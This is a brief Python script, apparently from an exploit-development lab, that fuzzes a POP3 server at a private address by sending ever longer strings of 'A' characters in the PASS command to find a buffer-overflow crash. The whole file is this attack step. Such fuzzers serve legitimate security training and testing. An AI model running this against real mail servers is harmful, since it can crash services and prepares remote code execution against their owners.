#!/usr/bin/env python3
import socket

eingabe = ["A"]
anzahl = 100

while len(eingabe) <= 35:
	eingabe.append("A"*anzahl)
	anzahl = anzahl + 200

for zeichenkette in eingabe:
	print (f"Fuzzing bei {len(zeichenkette)}")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(('192.168.2.135',110))
	s.recv(1024)
	s.send(b'USER gugugu \r\n')
	s.recv(1024)
	payload = b"".join(
	[
		b"PASS ",
		bytes(zeichenkette, "latin-1"),
		b"\r\n"
	]
)
	s.send(payload)
	s.send(b'QUIT\r\n')
	s.close()